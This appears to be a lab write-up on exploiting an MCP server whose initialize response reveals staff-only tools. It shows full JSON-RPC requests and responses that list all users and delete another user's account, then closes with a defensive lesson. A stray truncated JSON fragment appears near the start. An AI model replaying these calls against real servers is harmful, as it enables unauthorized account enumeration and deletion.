## Lab overview

The lab is a shop with an MCP endpoint at `/mcp`. The account page displays an API key and, more importantly, the server discloses instructions that were only ever meant to be seen and executed by staff accounts. Hiding a tool from the normal tool list is not the same as restricting access to it.

```json
      "version": "1.0"
    }
  }
}
```

## The information disclosure

The server's answer is where the lab falls apart:

```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "result": {
    "protocolVersion": "2025-06-18",
    "capabilities": {
      "tools": {
        "listChanged": false
      }
    },
    "serverInfo": {
      "name": "shop-mcp",
      "version": "1.0.0"
    },
    "instructions": "Browse the catalog with list_products and get_product, and check your account with get_account_details. Staff accounts can also manage customers with list_users and delete_user."
  }
}
```

The `instructions` field names two tools that should only be available to staff: `list_users` and `delete_user`. A normal user should never see them, but the server has already told us they exist. Let's call them.

## `list_users`

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "list_users"
  }
}
```

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "administrator\nwiener\ncarlos"
      }
    ],
    "isError": false
  }
}
```

Every account in the shop is returned: `administrator`, `wiener`, and `carlos`. The tool is hidden from the user interface, but it is fully callable.

## `delete_user`

There is one small wrinkle in the notes: the tool is named `delete_user` in the `initialize` instructions, but the exploratory call below uses `delete_users`. Send it with no arguments to discover the required schema:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "delete_users"
  }
}
```

<div className="max-w-[720px] mx-auto">

![Calling delete_user with no arguments](/images/writeups/portswigger/mcp-hidden-username-required.png)

</div>

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "username is required"
      }
    ],
    "isError": true
  }
}
```

The error tells us exactly what to add. Supply `username: carlos` to delete the target account:

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "delete_user",
    "arguments": {
      "username": "carlos"
    }
  }
}
```

```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "result": {
    "content": [
      {
        "type": "text",
        "text": "Deleted carlos"
      }
    ],
    "isError": false
  }
}
```

<div className="max-w-[720px] mx-auto">

![The response confirming Carlos was deleted](/images/writeups/portswigger/mcp-hidden-deleted.png)

</div>

The confirmation is unambiguous: an ordinary user has just deleted another account through a tool that was supposedly restricted to staff.

## Key takeaway

Omitting a tool from `tools/list` is a presentation decision, not an authorization control. The `initialize` response gave us the names of the privileged tools, and the server happily executed them for a non-staff user. Access control has to be enforced at the tool-call boundary, not by hiding the tool from the UI.
